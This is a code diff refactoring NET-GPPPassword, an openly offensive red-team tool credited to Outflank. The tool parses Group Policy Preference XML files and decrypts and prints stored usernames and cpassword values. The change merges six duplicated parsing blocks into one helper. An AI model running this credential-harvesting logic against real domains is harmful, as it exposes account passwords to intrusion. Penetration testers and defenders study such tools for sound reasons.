@@ -1,4 +1,4 @@
-﻿// NET-GPPPassword 
+// NET-GPPPassword 
 //
 // .NET port of Get-GPPPassword
 // Author: Stan Hegt (@StanHacked) / Outflank
@@ -84,6 +84,26 @@ namespace Net_GPPPassword
             }
         }
 
+        // This function parse the XML and extract the given node and print eventually found password
+        static void ParseAndPrintProperties(XmlDocument xml, string NodePath, string userAttribute )
+        {
+            XmlNodeList xnList;
+            xnList = xml.SelectNodes(NodePath);
+            foreach (XmlNode xn in xnList)
+            {
+                try
+                {
+                    Console.WriteLine("[RESULT]  Username: {0}", xn.Attributes[userAttribute].Value);
+                    Console.WriteLine("[RESULT]  Changed:  {0}", xn.ParentNode.Attributes["changed"].Value);
+                    Console.WriteLine("[RESULT]  Password: {0}", DecryptCPassword(xn.Attributes["cpassword"].Value));
+                }
+                catch
+                {
+                    // Swallow
+                }
+            }
+        }
+
         static void ProcessFile(string path)
         {
             Console.WriteLine("Parsing file: {0}", path);
@@ -98,106 +118,25 @@ namespace Net_GPPPassword
                 Console.WriteLine("Error parsing {0}", path);
                 return;
             }
-
-            string resultPrefixString = "[RESULT] ";
-            XmlNodeList xnList;
             switch (Path.GetFileName(path).ToLower())
             {
                 case "groups.xml":
-                    xnList = xml.SelectNodes("/Groups/User/Properties");
-                    foreach (XmlNode xn in xnList)
-                    {
-                       try
-                        {
-                            Console.WriteLine("{0} Username: {1}", resultPrefixString, xn.Attributes["userName"].Value);
-                            Console.WriteLine("{0} Changed:  {1}", resultPrefixString, xn.ParentNode.Attributes["changed"].Value);
-                            Console.WriteLine("{0} Password: {1}", resultPrefixString, DecryptCPassword(xn.Attributes["cpassword"].Value));
-                        }
-                        catch
-                        {
-                            // Swallow
-                        }
-                    }
+                    ParseAndPrintProperties(xml, "/Groups/User/Properties", "userName");
                     break;
                 case "services.xml":
-                    xnList = xml.SelectNodes("/NTServices/NTService/Properties");
-                    foreach (XmlNode xn in xnList)
-                    {
-                        try
-                        {
-                            Console.WriteLine("{0} Username: {1}", resultPrefixString, xn.Attributes["accountName"].Value);
-                            Console.WriteLine("{0} Changed:  {1}", resultPrefixString, xn.ParentNode.Attributes["changed"].Value);
-                            Console.WriteLine("{0} Password: {1}", resultPrefixString, DecryptCPassword(xn.Attributes["cpassword"].Value));
-                        }
-                        catch
-                        {
-                            // Swallow
-                        }
-                    }
+                    ParseAndPrintProperties(xml, "/NTServices/NTService/Properties", "accountName");
                     break;
                 case "scheduledtasks.xml":
-                    xnList = xml.SelectNodes("/ScheduledTasks/Task/Properties");
-                    foreach (XmlNode xn in xnList)
-                    {
-                        try
-                        {
-                            Console.WriteLine("{0} Username: {1}", resultPrefixString, xn.Attributes["runAs"].Value);
-                            Console.WriteLine("{0} Changed:  {1}", resultPrefixString, xn.ParentNode.Attributes["changed"].Value);
-                            Console.WriteLine("{0} Password: {1}", resultPrefixString, DecryptCPassword(xn.Attributes["cpassword"].Value));
-                        }
-                        catch
-                        {
-                            // Swallow
-                        }
-                    }
+                    ParseAndPrintProperties(xml, "/ScheduledTasks/Task/Properties", "runAs");
                     break;
                 case "datasources.xml":
-                    xnList = xml.SelectNodes("/DataSources/DataSource/Properties");
-                    foreach (XmlNode xn in xnList)
-                    {
-                        try
-                        {
-                            Console.WriteLine("{0} Username: {1}", resultPrefixString, xn.Attributes["username"].Value);
-                            Console.WriteLine("{0} Changed:  {1}", resultPrefixString, xn.ParentNode.Attributes["changed"].Value);
-                            Console.WriteLine("{0} Password: {1}", resultPrefixString, DecryptCPassword(xn.Attributes["cpassword"].Value));
-                        }
-                        catch
-                        {
-                            // Swallow
-                        }
-                    }
+                    ParseAndPrintProperties(xml, "/DataSources/DataSource/Properties", "username");
                     break;
                 case "printers.xml":
-                    xnList = xml.SelectNodes("/Printers/SharedPrinter/Properties");
-                    foreach (XmlNode xn in xnList)
-                    {
-                        try
-                        {
-                            Console.WriteLine("{0} Username: {1}", resultPrefixString, xn.Attributes["username"].Value);
-                            Console.WriteLine("{0} Changed:  {1}", resultPrefixString, xn.ParentNode.Attributes["changed"].Value);
-                            Console.WriteLine("{0} Password: {1}", resultPrefixString, DecryptCPassword(xn.Attributes["cpassword"].Value));
-                        }
-                        catch
-                        {
-                            // Swallow
-                        }
-                    }
+                    ParseAndPrintProperties(xml, "/Printers/SharedPrinter/Properties", "username");
                     break;
                 case "drives.xml":
-                    xnList = xml.SelectNodes("/Drives/Drive/Properties");
-                    foreach (XmlNode xn in xnList)
-                    {
-                        try
-                        {
-                            Console.WriteLine("{0} Username: {1}", resultPrefixString, xn.Attributes["username"].Value);
-                            Console.WriteLine("{0} Changed:  {1}", resultPrefixString, xn.ParentNode.Attributes["changed"].Value);
-                            Console.WriteLine("{0} Password: {1}", resultPrefixString, DecryptCPassword(xn.Attributes["cpassword"].Value));
-                        }
-                        catch
-                        {
-                            // Swallow
-                        }
-                    }
+                    ParseAndPrintProperties(xml, "/Drives/Drive/Properties", "username");
                     break;
             }
         }
